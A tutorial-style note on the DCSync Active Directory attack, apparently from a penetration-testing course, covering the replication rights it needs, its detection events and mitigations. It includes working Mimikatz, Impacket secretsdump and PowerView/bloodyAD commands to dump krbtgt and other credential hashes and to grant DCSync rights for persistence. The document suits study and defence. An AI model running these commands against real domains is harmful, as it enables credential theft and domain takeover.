
**DCSync** is an Active Directory attack technique that abuses directory replication permissions to make a compromised account behave like a **Domain Controller** and request credential data from another DC.

It uses the **Directory Replication Service Remote Protocol (MS-DRSR)**, which is a legitimate Active Directory replication mechanism.

```text
Replication Permissions
        ↓
   MS-DRSR / DRSUAPI
        ↓
   Domain Controller
        ↓
Credential Material
        ↓
NTLM / Kerberos Keys / Password Data
```

---

# Required Permissions

Full DCSync generally requires these replication rights on the **domain naming context**:

|Permission|Meaning|
|---|---|
|`DS-Replication-Get-Changes`|Allows directory replication changes|
|`DS-Replication-Get-Changes-All`|Allows replication of sensitive/all directory data|
|`DS-Replication-Get-Changes-In-Filtered-Set`|Relevant to filtered/confidential replication data|

For a typical **full DCSync**, the important combination is:

```text
DS-Replication-Get-Changes
              +
DS-Replication-Get-Changes-All
              ↓
          Full DCSync
```

`DS-Replication-Get-Changes-In-Filtered-Set` is commonly delegated alongside the other rights, but it is not by itself what grants a normal `krbtgt` DCSync dump.

---

# Default Principals

By default, replication privileges are associated with highly privileged principals such as:
- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers

The security problem occurs when these permissions are **incorrectly delegated to unexpected accounts or groups**.

For example:
```text
Domain
  │
  ├── Domain Admins       ✓ Expected
  ├── Domain Controllers  ✓ Expected
  └── user123             ⚠ Unexpected DCSync rights
```

---

# Perform DCSync Locally

Mimikatz:
```text
lsadump::dcsync /domain:<DOMAIN> /user:<USER>
```

Example:
```text
lsadump::dcsync /domain:dcorp.local /user:dcorp\krbtgt
```

To retrieve the `krbtgt` secret:
```text
lsadump::dcsync /domain:dcorp.local /user:krbtgt
```

Concept:
```text
Compromised Account
        ↓
Replication Rights
        ↓
Mimikatz DCSync
        ↓
Domain Controller
        ↓
KRBTGT Secret
```

---

# Perform DCSync Remotely

Impacket `secretsdump.py` can perform DCSync remotely:
```bash
secretsdump.py \
-just-dc \
<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

Example:
```bash
secretsdump.py \
-just-dc \
dcorp.local/administrator:'Password123!'@192.168.56.10
```

### Get Only One Account
```bash
secretsdump.py \
-just-dc-user krbtgt \
<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

This is useful when you only need a specific account instead of dumping the entire directory.

---

# Useful `secretsdump.py` Options

|Option|Purpose|
|---|---|
|`-just-dc`|Dump domain credentials through DCSync|
|`-just-dc-user <USER>`|Retrieve only a specific account|
|`-just-dc-ntlm`|Retrieve NTLM material only|
|`-ldapfilter <FILTER>`|Limit objects using an LDAP filter|
|`-pwd-last-set`|Show password last-set information|
|`-user-status`|Show enabled/disabled status|
|`-history`|Retrieve password history|

Example:
```bash
secretsdump.py \
-just-dc-user krbtgt \
<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

---

# DCSync Output

A full DCSync operation can provide different credential material, including:

```text
NTLM Hashes
Kerberos Keys
Password History
Reversible-Encryption Passwords
```

For example:
```text
User
 ↓
NT Hash
 ↓
Kerberos Keys
 ↓
Additional credential material
```

If reversible password encryption is enabled for an account, additional password information may be recoverable.

---

# DCSync with a Kerberos Ticket

DCSync does not necessarily require a username/password pair.

If you possess a valid Kerberos credential cache for a sufficiently privileged account, Impacket can use it.

For example:

```bash
export KRB5CCNAME=<TICKET>.ccache
```

Then:
```bash
secretsdump.py \
-just-dc \
-k \
-no-pass \
<DOMAIN>/ \
-dc-ip <DC_IP>
```

- `-k` → Use Kerberos authentication.
- `-no-pass` → Don't request a password.
- `KRB5CCNAME` → Kerberos credential cache.

Concept:
```text
Valid Kerberos Ticket
        ↓
Kerberos Authentication
        ↓
DC
        ↓
DRSUAPI / DCSync
        ↓
Credential Material
```

---

# Scoped DCSync

Instead of dumping the entire directory, restrict the operation to what is required.

### Only `krbtgt`
```bash
secretsdump.py \
-just-dc-user krbtgt \
<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### NTLM material only
```bash
secretsdump.py \
-just-dc-ntlm \
<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### LDAP filter
```bash
secretsdump.py \
-just-dc-ntlm \
-ldapfilter '(adminCount=1)' \
<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

Scoped collection is useful during authorized assessments because it reduces unnecessary credential exposure.

---

# DCSync and Golden Ticket

DCSync is often used as a **precursor to a Golden Ticket attack**.
```text
DCSync
   ↓
Obtain KRBTGT Secret
   ↓
Forge Golden Ticket
   ↓
Obtain Kerberos Access
   ↓
Domain-Level Access
```

This is why unexpected DCSync permissions are particularly dangerous.

---

# DCSync vs NTDS.dit

| DCSync                             | NTDS.dit Extraction                          |
| ---------------------------------- | -------------------------------------------- |
| Uses AD replication protocol       | Reads the AD database                        |
| Can be performed remotely          | Usually requires access to the DC/database   |
| Doesn't require copying `NTDS.dit` | Requires obtaining database data             |
| Uses replication permissions       | Requires sufficient access to the DC         |
| Can target specific accounts       | Often results in broad credential extraction |

---

# Persistence Through DCSync Rights

If an attacker has sufficient administrative privileges, they can maliciously grant another account replication rights.

PowerView:
```powershell
Add-ObjectAcl `
-TargetDistinguishedName "DC=dollarcorp,DC=moneycorp,DC=local" `
-PrincipalSamAccountName <USER> `
-Rights DCSync `
-Verbose
```

Linux:
```bash
bloodyAD \
--host <DC_IP> \
-d <DOMAIN> \
-u <USER> \
-p '<PASSWORD>' \
add dcsync <TRUSTEE>
```

Afterward, the delegated account can potentially perform DCSync.

Concept:
```text
Domain Admin
     ↓
Modify Domain ACL
     ↓
Grant DCSync Rights
     ↓
Compromised User
     ↓
DCSync
```

This makes unauthorized replication ACL changes an important persistence indicator.

---

# Detection

Relevant Windows Security events include:

|Event ID|Meaning|
|---|---|
|`4662`|An operation was performed on an AD object|
|`5136`|A directory service object was modified|
|`4670`|Permissions on an object were changed|

### Event 4662

DCSync activity can generate **4662** events when appropriate directory-service auditing is enabled.

Defenders can monitor for replication-related access to the domain naming context by unexpected accounts.

### Event 5136 / 4670

These are especially useful for detecting changes to ACLs that could grant DCSync rights.

```text
5136 / 4670
     ↓
Domain ACL Modified
     ↓
Unexpected Replication Rights
     ↓
Potential DCSync Persistence
```

---

# Mitigation

### 1. Restrict Replication Rights

Regular users should not have:
```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

unless there is a documented requirement.

### 2. Monitor Domain ACLs

Regularly review:
```text
Domain ACL
    ↓
Replication Rights
    ↓
Unexpected Trustees
```

Tools such as **AD ACL Scanner** can help identify and compare AD permission changes.

### 3. Monitor DCSync Activity

Enable appropriate directory-service auditing and investigate unexpected replication requests.

### 4. Protect Privileged Accounts

DCSync commonly becomes possible after compromise of a highly privileged account, so protecting Domain Admin and other privileged identities is critical.

---

# Key Takeaways

- **DCSync abuses legitimate AD replication functionality.**
    
- It uses **MS-DRSR / DRSUAPI** to request directory credential data.
    
- Full DCSync generally requires:
    - `DS-Replication-Get-Changes`
    - `DS-Replication-Get-Changes-All`
        
- `DS-Replication-Get-Changes-In-Filtered-Set` is relevant to filtered/confidential replication but isn't by itself the normal requirement for dumping `krbtgt`.
    
- Mimikatz:
    ```text
     lsadump::dcsync
    ```
    
- Impacket:
    ```bash
    secretsdump.py -just-dc
    ```
    
- DCSync can retrieve **NTLM hashes and Kerberos keys**, among other credential material.
    
- The `krbtgt` secret obtained through DCSync can be used to create a **Golden Ticket**.
    
- Unexpected replication permissions are a major AD security concern.
    
- Monitor **4662**, **5136**, and **4670** with the necessary auditing enabled.
    
- **DCSync = obtain secrets through replication; Golden Ticket = use the `krbtgt` secret to forge a TGT.**